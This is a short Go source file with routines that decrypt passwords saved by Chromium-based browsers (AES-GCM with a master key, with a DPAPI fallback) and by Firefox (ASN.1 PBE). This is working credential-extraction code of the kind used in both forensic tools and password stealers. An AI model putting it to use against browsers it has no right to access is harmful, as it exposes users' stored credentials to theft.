package browsers

import (
	"crypto/aes"
	"crypto/cipher"
	"errors"
)

func (c *Chromium) Decrypt(encryptPass []byte) ([]byte, error) {
	if len(c.MasterKey) == 0 {
		return DPAPI(encryptPass)
	}

	if len(encryptPass) < 15 {
		return nil, errors.New("empty password")
	}

	crypted := encryptPass[15:]
	nounce := encryptPass[3:15]

	block, err := aes.NewCipher(c.MasterKey)
	if err != nil {
		return nil, err
	}
	blockMode, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	origData, err := blockMode.Open(nil, nounce, crypted, nil)
	if err != nil {
		return nil, err
	}
	return origData, nil
}

func (g *Gecko) Decrypt(encryptPass []byte) ([]byte, error) {
	PBE, err := NewASN1PBE(encryptPass)
	if err != nil {
		return nil, err
	}
	var key []byte
	return PBE.Decrypt(g.MasterKey, key)
}
